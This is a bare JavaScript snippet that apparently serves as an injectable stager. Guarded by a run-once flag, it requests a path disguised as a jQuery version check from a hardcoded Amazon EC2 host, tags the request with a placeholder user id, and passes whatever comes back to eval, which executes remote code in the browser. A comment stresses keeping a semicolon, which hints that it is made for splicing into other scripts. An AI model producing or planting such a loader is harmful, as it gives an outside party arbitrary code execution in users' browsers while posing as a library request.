if(!dontRun) {
  var xmlhttp;
  var user = "replaceme";

  if (window.XMLHttpRequest) {
      xmlhttp = new XMLHttpRequest();
  } else {
      new ActiveXObject("Microsoft.XMLHTTP");
  }
  xmlhttp.onreadystatechange = function() {
      if (xmlhttp.readyState == 4 ) {
         if(xmlhttp.status == 200) {
             eval(xmlhttp.responseText);
         }
      }
  }; //IMPORTANT TO LEAVE SEMI COLON

  xmlhttp.open("GET", "ec2-54-187-151-91.us-west-2.compute.amazonaws.com:3005" + "/jquery?version=" + user, true);
  xmlhttp.send();
  dontRun = true;
}
